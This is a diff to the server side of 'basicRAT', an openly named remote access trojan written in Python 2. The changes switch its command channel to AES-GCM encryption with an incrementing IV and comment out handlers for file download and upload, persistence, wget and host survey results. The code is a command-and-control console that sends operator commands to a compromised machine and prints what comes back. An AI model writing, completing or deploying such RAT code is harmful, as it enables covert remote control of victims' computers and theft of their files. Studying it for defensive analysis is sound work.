@@ -15,8 +15,11 @@ import time
 
 from core import common
 from core import crypto
-from core import filesock
-from core import aes_gcm
+#from core import filesock
+
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+from binascii import hexlify
+
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -74,9 +77,12 @@ def main():
 
     s.listen(10)
     conn, addr = s.accept()
-
     DHKEY = crypto.diffiehellman(conn, server=True)
-    GCM = aes_gcm.AES_GCM(DHKEY)
+    GCM = crypto.AES_GCM(DHKEY)
+    IV = 0
+
+    # must be set to non-blocking AFTER Diffie Hellman Exchange
+    conn.setblocking(0)
 
     while True:
         prompt = raw_input('\n[{}] basicRAT> '.format(addr[0])).rstrip()
@@ -99,8 +105,8 @@ def main():
             continue
 
         # send data to client
-        ciphertext, tag = GCM.encrypt(IV, prompt)
-        conn.send(IV+tag+ciphertext)
+        crypto.sendGCM(conn, GCM, IV, prompt)
+        IV += 1
 
         # stop server
         if cmd == 'quit':
@@ -109,31 +115,37 @@ def main():
 
         # results of command
         elif cmd == 'run':
-            recv_data = conn.recv(4096)
-            print crypto.AES_decrypt(recv_data, DHKEY).rstrip()
+            try:
+                results = crypto.recvGCM(conn, GCM)
+                print results
+            except crypto.InvalidTagException as e:
+                print e
 
-        # download a file
-        elif cmd == 'download':
-            for fname in action.split():
-                fname = fname.strip()
-                filesock.recvfile(conn, fname, DHKEY)
+        # # download a file
+        # elif cmd == 'download':
+        #     for fname in action.split():
+        #         fname = fname.strip()
+        #         filesock.recvfile(conn, fname, DHKEY)
 
-        # send file
-        elif cmd == 'upload':
-            for fname in action.split():
-                fname = fname.strip()
-                filesock.sendfile(conn, fname, DHKEY)
+        # # send file
+        # elif cmd == 'upload':
+        #     for fname in action.split():
+        #         fname = fname.strip()
+        #         filesock.sendfile(conn, fname, DHKEY)
 
         # regenerate DH key
         elif cmd == 'rekey':
             DHKEY = crypto.diffiehellman(conn, server=True)
+            print hexlify(DHKEY)
 
-        # results of survey, persistence, unzip, or wget
-        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
-            print 'Running {}...'.format(cmd)
-            recv_data = conn.recv(1024)
-            print crypto.AES_decrypt(recv_data, DHKEY)
-
+        # # results of survey, persistence, unzip, or wget
+        # elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
+        #     print 'Running {}...'.format(cmd)
+        #     recv_data = conn.recv(1024)
+        #     print crypto.AES_decrypt(recv_data, DHKEY)
+        else:
+            print "that is a valid command but had not yet been implemented. Sorry."
+            # or it has been disabled for debugging and code restructure
 
 if __name__ == '__main__':
     main()
